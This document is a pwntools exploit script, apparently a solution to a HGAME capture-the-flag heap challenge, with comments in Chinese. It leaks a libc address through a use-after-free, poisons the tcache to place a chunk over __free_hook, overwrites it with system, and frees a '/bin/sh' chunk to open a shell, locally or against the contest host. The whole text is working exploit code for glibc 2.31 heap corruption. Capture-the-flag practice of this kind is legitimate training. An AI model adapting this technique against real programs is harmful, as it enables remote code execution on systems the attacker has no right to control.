from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30709)#远程连接
    gdb_is =0
libc = ELF('./libc-2.31.so')
elf = ELF('./vuln')

if gdb_is:
    gdb.attach(r)
    pause()
    pass

def add_note(page , size):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())

def delete_note(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def edit_note(page , content):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Content:' , content)

def show_note(page):
    r.sendlineafter(b'Exit',b'4')
    r.sendlineafter(b'Index:', str(page).encode())

for i in range(9):
    add_note(i,0x80)
for i in range(8):
    delete_note(i)

show_note(7)

libc_main_arena = 0x1ECB80 + 88 + 8
main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) 

libc_addr = main_arena_addr - libc_main_arena


libc.address=libc_addr
system_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
# one_gadget_addr = libc_addr + 0xe3b04

edit_note(6,p64(free_hook))#UAF 把tcache[6]中的next指针覆写为free_hook_addr
add_note(9,0x80) #9为从tcache申请的chunk
add_note(10,0x80) #10为 malloc返回的free_hook的指针
edit_note(9,b'/bin/sh\x00') 
edit_note(10,p64(system_addr))#向free_hook中写入system地址


print(f'main_arena_addr = {hex(main_arena_addr)}')
print(f'system_addr = {hex(system_addr)}')
print(f'libc_addr = {hex(libc_addr)}')
print(f'free_hook = {hex(free_hook)}')

gdb.attach(r)
pause()

delete_note(9)



r.interactive()
